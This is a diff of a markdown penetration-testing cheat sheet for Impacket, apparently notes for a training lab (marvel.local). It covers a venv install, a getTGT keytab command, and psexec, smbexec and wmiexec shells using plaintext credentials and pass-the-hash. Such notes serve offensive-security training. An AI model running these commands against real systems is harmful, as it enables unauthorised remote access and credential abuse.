@@ -1,36 +1,79 @@
-#### Impacket for Windows
+
+# Python venv quick launch
+
 ```
-https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries
+source ~/impacket/venv/bin/activate
 ```
 
-#### Latest Version
-```bash - kali
-sudo pip3 uninstall impacket
+# Python venv Install (skip if done already):
+```
+git clone https://github.com/fortra/impacket.git ~/impacket && cd ~/impacket
 ```
 
-```bash - kali
-sudo git clone https://github.com/cube0x0/impacket
+```
+python3 -m venv venv && source venv/bin/activate && pip install .
 ```
 
-```bash - kali
-cd impacket
+
+
+## Usage (Start here after initial install):
+```
+source ~/impacket/venv/bin/activate
 ```
 
-```bash - kali
-sudo python3 ./setup.py install
+```
+python3 ~/impacket/examples/getTGT.py -k -no-pass 'COMPLYEDGE.COM/WEB05$' -keytab krb5.keytab
 ```
 
-#### Older version
-```bash - kali
-sudo git clone https://github.com/SecureAuthCorp/impacket
+
+#### Shell with psexec.py
+When we have valid credentials, we can simply login to target.
+```python
+python3 psexec.py marvel.local/fcastle:Password1@$TARGET
 ```
 
-#### psexec.py
-```bash - kali
-python3 psexec.py $USER:$PASSWORD@$TARGET
+#### Passing the hash
+When we have username and hash, we can login to target.
+```python
+python3 psexec.py marvel.local/fcastle@192.168.111.138 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
 ```
 
-#### Get-GPPPassword
-```bash - kali
-impacket-Get-GPPPassword $DOMAIN/$USER:$PASSWORD@$TARGET
+#### Shell with smbexec.py
+When we have valid credentials, we can simply login to target.
+```python
+smbexec.py marvel.local/fcastle:Password1@$TARGET
 ```
+
+#### Passing the hash
+When we have username and hash, we can login to target.
+```python
+smbexec.py marvel.local/fcastle@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
+```
+
+#### Shell with wmi.py
+When we have valid credentials, we can simply login to target.
+```python
+wmiexec.py marvel.local/fcastle:Password1@$TARGET
+```
+#### Passing the hash
+When we have username and hash, we can login to target.
+```python
+wmiexec.py marvel.local/fcastle@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
